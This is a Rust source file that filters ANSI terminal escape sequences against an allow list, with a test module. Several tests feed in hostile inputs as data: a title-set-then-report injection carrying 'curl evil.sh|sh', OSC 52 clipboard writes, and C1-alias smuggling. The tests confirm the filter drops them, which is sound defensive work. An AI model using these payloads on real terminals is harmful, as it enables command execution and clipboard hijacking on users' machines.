use unicode_general_category::GeneralCategory;
use vte::{Params, Parser, Perform};

const COMBINING_MARKER_CONSECUTIVE_MAX: usize = 8;
const MAX_STRING_SEQUENCE: usize = 4096;
const ANSI_ESC: u8 = 0x1B;
// https://invisible-island.net/xterm/ctlseqs/ctlseqs.pdf
// Page 18
const ALLOWED_PRIVATE_MODES: &[u16] = &[
    1,  // application cursor keys
    25, // cursor visibility
    47, 1047, 1049, // alternate screen buffer
    1000, 1002, 1003, 1004, 1005, 1006, 1015, // mouse tracking variants
    2004, // bracketed paste
    2026, // synchronized inputs
];

pub struct AnsiFilter {
    // TODO: Do we need to limit the parser buffer?
    parser: Parser,
    // Track sequence to prevent blocking too much here
    current_string_sequence_length: usize,
}

impl Default for AnsiFilter {
    fn default() -> Self {
        Self::new()
    }
}

impl AnsiFilter {
    pub fn new() -> Self {
        AnsiFilter {
            parser: Parser::new_with_size(),
            current_string_sequence_length: 0,
        }
    }

    pub fn filter(&mut self, input: &[u8], output: &mut Vec<u8>) {
        let before = output.len();
        // Actual parsing here and the performer handles filtering
        self.parser
            .advance(&mut FilterPerformer::new(output), input);

        if output.len() > before {
            // parser has written sequence and we are done
            self.current_string_sequence_length = 0;
        } else {
            // parser still did not find the end of the sequence and is going
            self.current_string_sequence_length = self
                .current_string_sequence_length
                .saturating_add(input.len());
            if self.current_string_sequence_length > MAX_STRING_SEQUENCE {
                // // Reset after an excessively long sequence
                *self = Self::new();
            }
        }
    }
}

// TODO: Should we add a log mode to log what got filtered?
struct FilterPerformer<'a> {
    output: &'a mut Vec<u8>,
    combining_marker_count: usize,
}

impl<'a> FilterPerformer<'a> {
    pub fn new(output: &'a mut Vec<u8>) -> Self {
        Self {
            output,
            combining_marker_count: 0,
        }
    }

    fn write_csi(&mut self, params: &Params, intermediates: &[u8], action: char) {
        self.output.extend_from_slice(&[ANSI_ESC, b'[']);

        let (markers, trailing): (Vec<u8>, Vec<u8>) = intermediates
            .iter()
            .copied()
            .partition(|&b| (0x3C..=0x3F).contains(&b));

        self.output.extend_from_slice(&markers);

        for (index, parameter) in params.iter().enumerate() {
            if index > 0 {
                self.output.push(b';');
            }
            for (index, sub_parameter) in parameter.iter().enumerate() {
                if index > 0 {
                    self.output.push(b':');
                }
                self.output
                    .extend_from_slice(sub_parameter.to_string().as_bytes());
            }
        }

        self.output.extend_from_slice(&trailing);

        match action as u32 {
            0x40..=0x7E => self.output.push(action as u8),
            _ => {
                debug_assert!(
                    false,
                    "invalid CSI final byte: {action:?} (must be ASCII 0x40..=0x7E)"
                );
            }
        }
    }
}

// Device controlls are ignored
// Operating system commands are ignored -> this is very important since clipboard access lives here
impl Perform for FilterPerformer<'_> {
    fn print(&mut self, character: char) {
        if is_format_char(character) {
            return;
        }

        if is_combining_mark(character) {
            self.combining_marker_count += 1;
            if self.combining_marker_count > COMBINING_MARKER_CONSECUTIVE_MAX {
                // I can't see why we would need to support more
                return;
            }
        } else {
            self.combining_marker_count = 0;
        }
        // UTF-8  max bytes are 4
        let mut buffer = [0u8; 4];
        self.output
            .extend_from_slice(character.encode_utf8(&mut buffer).as_bytes());
    }

    fn execute(&mut self, byte: u8) {
        // Deny NUL sequence OR full C1 (apparently no keyboard can even emit this)
        if byte == 0x00 || (0x80..=0x9F).contains(&byte) {
            return;
        }
        // Allow all C0
        self.output.extend_from_slice(&[byte]);
    }

    // Interactive terminal control -> cursor, colors etc.
    fn csi_dispatch(&mut self, params: &Params, intermediates: &[u8], ignore: bool, action: char) {
        if ignore {
            return;
        }

        match intermediates {
            // Just a action, check if we allow it
            [] => {
                if allowed_csi(action, params) {
                    self.write_csi(params, intermediates, action);
                }
            }
            // private mode actions
            [b'?'] => {
                // h -> set / enable a DEC private mode
                // l -> reset / disable a DEC private mode
                if !matches!(action, 'h' | 'l') {
                    return;
                }

                let modes: Vec<u16> = mode_numbers(params).collect();

                if modes.iter().all(|m| ALLOWED_PRIVATE_MODES.contains(m)) {
                    self.write_csi(params, intermediates, action);
                }
            }
            // Sets cursor style
            [b' '] if action == 'q' => {
                self.write_csi(params, intermediates, action);
            }
            _ => {}
        }
    }

    // Terminal state -> save and restore terminal state etc.
    fn esc_dispatch(&mut self, intermediates: &[u8], ignore: bool, byte: u8) {
        if ignore || !intermediates.is_empty() {
            return;
        }

        // Only allow basic cursor movements
        if allowed_esc(byte) {
            self.output.extend_from_slice(&[ANSI_ESC, byte]);
        }
    }

    // Explicit ignore
    fn osc_dispatch(&mut self, _params: &[&[u8]], _bell_terminated: bool) {}
    fn hook(&mut self, _params: &Params, _intermediates: &[u8], _ignore: bool, _action: char) {}
    fn put(&mut self, _byte: u8) {}
    fn unhook(&mut self) {}
}

fn mode_numbers(params: &Params) -> impl Iterator<Item = u16> + '_ {
    params.iter().filter_map(|p| p.first().copied())
}

// This prevents invisible chars
fn is_format_char(c: char) -> bool {
    unicode_general_category::get_general_category(c) == GeneralCategory::Format
}

// This prevents touching previous chars
fn is_combining_mark(c: char) -> bool {
    matches!(
        unicode_general_category::get_general_category(c),
        GeneralCategory::NonspacingMark
            | GeneralCategory::SpacingMark
            | GeneralCategory::EnclosingMark
    )
}

// Allow list for CSI actions
fn allowed_csi(action: char, params: &Params) -> bool {
    match action {
        // SGR: text styling and colors
        'm' => true,

        // Cursor up
        'A' => true,
        // Cursor down
        'B' => true,
        // Cursor right
        'C' => true,
        // Cursor left
        'D' => true,
        // Cursor down + line start
        'E' => true,
        // Cursor up + line start
        'F' => true,
        // Cursor column
        'G' => true,
        // Cursor position
        'H' => true,

        // Keyboard/editing keys
        '~' => {
            // F keys are not allowed
            // Here is a list that would add F1 to F12
            // 11 | 12 | 13 | 14 | 15 | 17 | 18 | 19 | 20 | 21 | 23 | 24
            let n: Vec<u16> = params.iter().flatten().copied().collect();
            matches!(n.first(), Some(1..=8))
        }

        // Insert lines
        'L' => true,
        // Delete lines
        'M' => true,

        // Delete characters
        'P' => true,
        // Insert characters
        '@' => true,

        // Erase characters
        'X' => true,

        // Erase display
        'J' => !params.iter().any(|p| p.contains(&3)),
        // Erase line
        'K' => true,

        // Save cursor
        's' => true,
        // Restore cursor
        'u' => true,
        // Set scrolling region
        'r' => true,

        _ => false,
    }
}

fn allowed_esc(byte: u8) -> bool {
    match byte {
        // Save cursor
        b'7' => true,
        // Restore cursor
        b'8' => true,
        // Cursor down
        b'D' => true,
        // Cursor up
        b'M' => true,
        // Cursor down + line start
        b'E' => true,
        // Set tab stop
        b'H' => true,

        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn filter(input: &[u8]) -> Vec<u8> {
        let mut output = Vec::new();
        AnsiFilter::new().filter(input, &mut output);
        output
    }

    /// Feed the input one byte at a time to make sure the filter is not fooled by chunk boundaries
    fn filter_bytewise(input: &[u8]) -> Vec<u8> {
        let mut output = Vec::new();
        let mut escape_filter = AnsiFilter::new();
        for byte in input {
            escape_filter.filter(&[*byte], &mut output);
        }
        output
    }

    #[test]
    fn passes_plain_text_through() {
        assert_eq!(filter(b"hello world\r\n"), b"hello world\r\n");
    }

    #[test]
    fn passes_colors_and_cursor_movement_through() {
        let input = b"\x1b[1;31mred\x1b[0m\x1b[2J\x1b[10;20H\x1b[?1049h\x1b[?2004h";
        assert_eq!(filter(input), input);
        assert_eq!(filter_bytewise(input), input);
    }

    #[test]
    fn passes_intermediates_on_the_right_side_of_the_parameters() {
        assert_eq!(filter(b"\x1b[?1000h"), b"\x1b[?1000h");
        assert_eq!(filter(b"\x1b[1 q"), b"\x1b[1 q");
        assert_eq!(filter(b"\x1b[38:2::255:0:0m"), b"\x1b[38:2:0:255:0:0m");
    }

    #[test]
    fn passes_multi_byte_utf8_through() {
        // Box drawing, arrows, dashes, quotes and emoji all have continuation bytes inside the C1
        // range, dropping those would shred every TUI frame
        let input = "┌─┐│└┘ → ← — “quoted” • é ± 😀 你好".as_bytes();
        assert_eq!(filter(input), input);
        assert_eq!(filter_bytewise(input), input);
        assert!(std::str::from_utf8(&filter(input)).is_ok());
    }

    #[test]
    fn passes_utf8_split_across_calls() {
        let input = "─😀".as_bytes();
        let mut output = Vec::new();
        let mut escape_filter = AnsiFilter::new();
        for chunk in input.chunks(2) {
            escape_filter.filter(chunk, &mut output);
        }
        assert_eq!(output, input);
    }

    #[test]
    fn drops_osc_52_clipboard_writes() {
        assert_eq!(filter(b"a\x1b]52;c;cGF5bG9hZA==\x07b"), b"ab");
        assert_eq!(filter(b"a\x1b]52;c;cGF5bG9hZA==\x1b\\b"), b"ab");
        assert_eq!(filter_bytewise(b"a\x1b]52;c;cGF5bG9hZA==\x07b"), b"ab");
    }

    #[test]
    fn drops_the_set_title_then_report_title_attack() {
        let input = b"\x1b]0;curl evil.sh|sh\x07\x1b[21t";
        assert_eq!(filter(input), b"");
        assert_eq!(filter_bytewise(input), b"");
    }

    #[test]
    fn drops_all_window_operations() {
        for request in [
            "\x1b[11t", "\x1b[13t", "\x1b[14t", "\x1b[18t", "\x1b[20t", "\x1b[21t",
        ] {
            assert_eq!(filter(request.as_bytes()), b"");
        }
    }

    #[test]
    fn drops_dcs_sos_pm_and_apc_strings() {
        assert_eq!(filter(b"a\x1bPq#0;2;0;0;0\x1b\\b"), b"ab");
        assert_eq!(filter(b"a\x1bXpayload\x1b\\b"), b"ab");
        assert_eq!(filter(b"a\x1b^payload\x1b\\b"), b"ab");
        assert_eq!(filter(b"a\x1b_payload\x1b\\b"), b"ab");
    }

    #[test]
    fn bel_does_not_terminate_a_dcs_string() {
        // Only OSC ends on BEL, a sixel payload containing 0x07 must not spill its tail as text
        assert_eq!(filter(b"\x1bPq#0;2;0;0;0\x07LEAKED\x1b\\ok"), b"ok");
    }

    #[test]
    fn drops_eight_bit_c1_aliases() {
        // Stray C1 bytes in ground state, the payload behind them is only ever text
        assert_eq!(
            filter(b"a\x9d52;c;cGF5bG9hZA==\x07b"),
            b"a52;c;cGF5bG9hZA==\x07b"
        );
        assert_eq!(filter(b"a\x9b21tb"), b"a21tb");
        // A C1 introducer hidden behind an ESC or inside a CSI must not reach the terminal either
        for input in [
            b"\x1b\x9d52;c;cGF5bG9hZA==\x07".as_slice(),
            b"\x1b[1\x9d52;c;AA==\x07".as_slice(),
        ] {
            let output = filter(input);
            assert!(
                !output.contains(&0x9d),
                "C1 introducer survived: {output:?}"
            );
        }
    }

    #[test]
    fn drops_the_utf8_encoded_form_of_a_c1_alias() {
        // A terminal in UTF-8 mode decodes `c2 9d` back to the OSC introducer
        assert_eq!(
            filter("a\u{9d}52;c;AA==\x07b".as_bytes()),
            b"a52;c;AA==\x07b"
        );
    }

    #[test]
    fn absorbs_an_overlong_sequence() {
        // The tail of a runaway sequence must not spill onto the terminal as text
        let mut output = Vec::new();
        let mut escape_filter = AnsiFilter::new();
        escape_filter.filter(&[ANSI_ESC, b'['], &mut output);
        escape_filter.filter(&[b'1'; 128], &mut output);
        // The parameter saturates, the sequence still has to be closed by a final byte
        escape_filter.filter(b"m", &mut output);
        escape_filter.filter(b"ok", &mut output);
        assert_eq!(output, b"\x1b[65535mok");
    }

    #[test]
    fn recovers_from_an_unterminated_string() {
        // Without a cap this would black out the console for the rest of the session
        let mut output = Vec::new();
        let mut escape_filter = AnsiFilter::new();
        escape_filter.filter(b"\x1b]", &mut output);
        escape_filter.filter(&[b'x'; MAX_STRING_SEQUENCE + 1], &mut output);
        escape_filter.filter(b"ok", &mut output);
        assert_eq!(output, b"ok");
    }

    #[test]
    fn cancel_aborts_a_string() {
        // A guest killed mid sequence must not take the console with it
        assert_eq!(filter(b"\x1b]0;title\x18hello"), b"\x18hello");
        assert_eq!(filter(b"\x1b]0;title\x1ahello"), b"\x1ahello");
    }
}
